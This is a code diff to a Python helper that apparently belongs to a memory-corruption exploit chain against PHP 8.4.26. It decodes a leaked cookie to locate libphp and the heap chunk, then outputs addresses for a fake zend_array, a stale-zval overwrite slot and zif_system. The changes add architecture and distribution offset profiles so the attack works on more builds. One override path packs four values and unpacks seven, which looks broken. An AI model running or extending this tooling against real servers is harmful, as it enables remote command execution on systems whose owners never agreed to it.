@@ -17,20 +17,53 @@ import argparse
 import sys
 from collections import Counter
 
-from decode_leak_cookie import (DEFAULT_SYMBOLS, MAX_PTR, MIN_PTR, load_cookie, slide_pointers,
-                                summarise, to_bytes)
+from decode_leak_cookie import (MAX_PTR, MIN_PTR, SYMBOL_PROFILES, DEFAULT_SYMBOLS, detect_arch,
+                                load_cookie, profile_key, slide_pointers, summarise, to_bytes)
 
 MAIN_DELTA = 0x400000   # measured: main chunk sits 4 MiB above the chunk the stale id lives in
 S_OFF = 0xF8398         # fake zend_array slot inside the main chunk (reference layout)
 HSV_OFF = 0x7D720       # the zval slot the fake reference must overwrite (reference layout)
 
 
-def parse_symbols(items):
-    symbols = dict(DEFAULT_SYMBOLS)
+def parse_symbols(items, profile):
+    symbols = {k: v for k, v in profile.items() if not k.endswith("_off")}
     for item in items:
         name, _, offset = item.partition("=")
         symbols[name.strip()] = int(offset.strip(), 0)
     return symbols
+
+
+def resolve_symbols(args, blob):
+    """Pick the offset table and heap layout: explicit --symbol wins, then the profile.
+
+    Without a symbol table the fingerprint step cannot find libphp at all, and with the wrong one it
+    finds a plausible base that is tens of MB off - the failure then shows up as B2 missing, not as a
+    symbol problem. The two heap slots are build-specific for the same reason.
+    """
+    arch = args.arch
+    inferred = False
+    if arch == "auto":
+        arch, inferred = detect_arch(blob), True
+        if not arch:
+            return None, None, None, "arch not detectable from the leak; pass --arch arm64|x86_64"
+    name = profile_key(arch, args.php_version, args.distro)
+    profile = SYMBOL_PROFILES.get(name)
+    if args.symbol:
+        base = profile or DEFAULT_SYMBOLS
+        layout = (base.get("s_off", S_OFF), base.get("hsv_off", HSV_OFF), base.get("spray_first", 8),
+                  base.get("n1", 500), base.get("vl", 384), base.get("sid_field", 1),
+                  base.get("fillers", 115))
+        return parse_symbols(args.symbol, base), name, layout, None
+    if profile is None:
+        return None, None, None, ("no symbol profile for %s; pass --symbol zval_ptr_dtor=0x...,"
+                                  "zif_system=0x...,zend_hash_destroy=0x... (or --arch/--php-version/"
+                                  "--distro)" % name)
+    if inferred:
+        print("arch: %s (inferred from the leak; --arch overrides)" % arch, file=sys.stderr)
+    return (parse_symbols([], profile), name,
+            (profile["s_off"], profile["hsv_off"], profile.get("spray_first", 8),
+             profile.get("n1", 500), profile.get("vl", 384), profile.get("sid_field", 1),
+             profile.get("fillers", 115)), None)
 
 
 def main(argv=None):
@@ -41,18 +74,35 @@ def main(argv=None):
     source.add_argument("--dump")
     ap.add_argument("--symbol", action="append", default=[],
                     help="name=offset inside libphp, e.g. zif_system=0x42cd70")
+    ap.add_argument("--arch", choices=["auto", "arm64", "x86_64"], default="auto",
+                    help="target architecture; auto reads it out of the leak")
+    ap.add_argument("--php-version", default="8.4.26",
+                    help="selects the offset profile; 8.4.26 (official image) unless the probe says "
+                         "otherwise")
+    ap.add_argument("--distro", default="",
+                    help="distribution tag from probe.php, e.g. debian13; selects the package profile")
     ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=None,
                     help="chunk bytes between the disclosed chunk and the main chunk; default is to "
                          "read the second chunk cluster out of the leak, which is what x86-64 needs")
-    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=S_OFF)
-    ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=HSV_OFF)
+    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=None,
+                    help="fake-array slot inside the main chunk; default from the profile")
+    ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=None,
+                    help="stale-zval slot inside the main chunk; default from the profile")
     ap.add_argument("--min-cluster", type=int, default=16,
                     help="pointers a fingerprint cluster needs before it counts as a load base")
     ap.add_argument("--emit", choices=["text", "shell"], default="text")
     args = ap.parse_args(argv)
 
-    symbols = parse_symbols(args.symbol)
     blob = to_bytes(load_cookie(args))
+    symbols, profile, layout, error = resolve_symbols(args, blob)
+    if error:
+        print(error, file=sys.stderr)
+        return 1
+    if args.s_off is not None:
+        layout = (args.s_off, layout[1], layout[2], layout[3])
+    if args.hsv_off is not None:
+        layout = (layout[0], args.hsv_off, layout[2], layout[3])
+    args.s_off, args.hsv_off, spray_first, n1, vl, sid_field, fillers = layout
     result = summarise(blob, symbols)
 
     libphp = result["libphp_base"]
@@ -84,14 +134,20 @@ def main(argv=None):
         libphp_chunk = libphp & ~0x1FFFFF
         candidates = []
         for base, count in clusters.items():
-            if base == disclosed or base == libphp_chunk:
+            if base == disclosed:
                 continue
-            # A neighbouring chunk of this heap is 2 MiB aligned and sits 2..8 MiB from the disclosed
-            # one: +4 MiB on arm64, +2/+6/+8 MiB on x86-64. The module's own buckets are much further
-            # away -- 21 to 30 MiB in the layouts measured. A 16 MiB bound therefore excludes them while
-            # keeping the real main chunk, which a 32 MiB "module range" blanket did not: on arm64 that
-            # window started at libphp and swallowed main, leaving no candidates at all.
-            if base & 0x1FFFFF or abs(base - disclosed) > (16 << 20):
+            # A neighbouring chunk of this heap is 2 MiB aligned. How far it sits is a property of the
+            # build: +4 MiB on the arm64 image, but 206..210 MiB on the Debian 13 package, where a
+            # 16 MiB window picked a small unrelated chunk and every B2 missed. The window is therefore
+            # wide (256 MiB) and the choice is made by pointer count, which is what separates the main
+            # chunk (hundreds of pointers) from the incidental ones (tens). Two things are excluded
+            # besides: bases below 4 GiB (pointer-shaped integers, not mappings) and the module's own
+            # mappings, whose data chunk carries as many pointers as the main chunk does. Those sit at
+            # and above the module base - on arm64 Debian the heap chunk lies 2 MiB *below* it, so the
+            # exclusion has to be one-sided or it throws the main chunk away.
+            if base & 0x1FFFFF or base < 0x1_0000_0000 or abs(base - disclosed) > (256 << 20):
+                continue
+            if 0 <= base - libphp_chunk <= (8 << 20):
                 continue
             candidates.append((count, base))
         if not candidates:
@@ -107,6 +163,11 @@ def main(argv=None):
         "MAIN": main_chunk,
         "S": main_chunk + args.s_off,
         "HSV": main_chunk + args.hsv_off,
+        "SPRAY_FIRST": spray_first,
+        "N1": n1,
+        "VL": vl,
+        "SID_FIELD": sid_field,
+        "FILLERS": fillers,
     }
     for name in ("zif_system", "zend_hash_destroy", "zval_ptr_dtor"):
         if name in symbols:
@@ -114,10 +175,12 @@ def main(argv=None):
 
     if args.emit == "shell":
         for name, value in values.items():
-            print("%s=%#x" % (name, value))
+            plain = name in ("SID_FIELD", "FILLERS")
+            print("%s=%s" % (name, value if plain else "%#x" % value))
         return 0
 
     print("decoded       : %d bytes, %d pointer windows" % (result["decoded_bytes"], result["pointer_windows"]))
+    print("symbols       : %s" % profile)
     print("disclosed     : %#x   (%d pointers, %d%% of the window)"
           % (disclosed, result["chunk_base_votes"], round(100 * result["chunk_base_share"])))
     print("libphp        : %#x   (%d pointers in the fingerprint cluster)"
